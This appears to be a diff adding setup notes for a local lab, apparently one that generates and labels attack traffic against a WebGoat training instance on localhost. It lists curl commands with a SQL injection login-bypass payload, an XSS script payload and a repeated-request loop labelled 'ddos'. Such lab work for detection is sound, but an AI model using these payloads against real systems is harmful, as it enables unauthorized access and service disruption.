@@ -1,0 +1,16 @@
+docker-compose up
+python tools/jsonl_to_csv.py
+python tools/auto_label.py
+
+
+sql :
+curl -X POST -d "username=' OR '1'='1'--&password=123" http://localhost:8010/WebGoat/login -v
+xss:
+curl -X POST -d "comment=<script>alert(1)</script>" http://localhost:8010/WebGoat/somepage -v
+ddos:
+FOR /L %i IN (1,1,60) DO curl -s -o NUL -w "%{http_code} " http://localhost:8010/WebGoat/
+
+
+
+http://localhost:8501
+http://localhost:8010/WebGoat   
